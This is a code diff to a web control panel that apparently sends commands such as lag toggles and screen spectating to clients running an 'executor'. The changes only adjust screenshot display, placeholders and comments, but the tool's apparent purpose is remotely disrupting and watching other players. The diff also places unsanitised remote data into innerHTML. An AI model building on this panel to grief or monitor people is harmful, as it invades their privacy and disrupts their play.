@@ -137,7 +137,7 @@
         .spec-modal-close { background: #1f2a36; border: 1px solid #2a3646; color: #c8d2df; padding: 6px 14px; border-radius: 20px; cursor: pointer; font-size: 12px; font-weight: 600; transition: all 0.2s; }
         .spec-modal-close:hover { background: #3d1a2a; border-color: #7f2d3f; color: #f87171; }
         .spec-screen-container { background: #0b0d11; border: 1px solid #1a232e; border-radius: 10px; overflow: hidden; position: relative; min-height: 400px; display: flex; align-items: center; justify-content: center; }
-        .spec-screen-container img { width: 100%; height: auto; display: block; }
+        .spec-screen-container img { width: 100%; height: auto; display: block; border-radius: 8px; }
         .spec-screen-placeholder { text-align: center; color: #6b7a8f; padding: 40px; }
         .spec-screen-placeholder .icon { font-size: 48px; margin-bottom: 12px; opacity: 0.3; }
         .spec-screen-placeholder p { font-size: 14px; margin-bottom: 4px; }
@@ -446,7 +446,6 @@
             setToggleState(toggleLagN, commandState.lag_n || false);
             setToggleState(toggleLagC, commandState.lag_c || false);
             
-            // Update Spec button state
             if (commandState.spectate) {
                 btnSpec.classList.add('active');
                 btnSpec.innerHTML = '👁 Spec ON';
@@ -548,7 +547,6 @@
         const isCurrentlySpectating = commandState.spectate;
         
         if (isCurrentlySpectating) {
-            // Disable spectate
             commandState.spectate = false;
             btnSpec.classList.remove('active');
             btnSpec.innerHTML = '👁 Spec';
@@ -557,7 +555,6 @@
                 closeSpecModal();
             });
         } else {
-            // Enable spectate
             commandState.spectate = true;
             btnSpec.classList.add('active');
             btnSpec.innerHTML = '👁 Spec ON';
@@ -601,19 +598,28 @@
 
     function updateSpecScreen(screenshotBase64) {
         if (screenshotBase64) {
-            specScreenContainer.innerHTML = `<img src="${screenshotBase64}" alt="Player screen" />`;
+            specScreenContainer.innerHTML = `<img src="${screenshotBase64}" alt="Player screen" style="max-width: 100%; border-radius: 8px;" />`;
+            specStatusText.textContent = 'Live · Receiving screenshots every 3 seconds';
+        } else {
+            specScreenContainer.innerHTML = `
+                <div class="spec-screen-placeholder">
+                    <div class="icon">📷</div>
+                    <p>Waiting for screenshot or not supported...</p>
+                    <p class="sub">The executor might not support screen capture.</p>
+                </div>
+            `;
+            specStatusText.textContent = 'Waiting for data...';
         }
     }
 
     function startSpecPolling() {
         if (specPollInterval) clearInterval(specPollInterval);
+        // Affiche immédiatement l'état d'attente
+        updateSpecScreen(null);
         specPollInterval = setInterval(async () => {
             if (!selectedUserId) return;
             const screenshot = await fetchScreenshot(selectedUserId);
-            if (screenshot) {
-                updateSpecScreen(screenshot);
-                specStatusText.textContent = 'Live · Receiving screenshots every 3 seconds';
-            }
+            updateSpecScreen(screenshot);
         }, 3000);
     }
 
@@ -653,7 +659,7 @@
     setTimeout(() => { if (!selectedUserId) { const first = Array.from(players.values()).find(p => p.online); if (first) selectPlayer(first.user_id); } }, 2000);
 
     // ══════════════════════════════════════════════════════════
-    // ADMIN MODAL LOGIC (mot de passe admin demandé à chaque fois)
+    // ADMIN MODAL LOGIC
     // ══════════════════════════════════════════════════════════
     let currentAdminPassword = '';
 
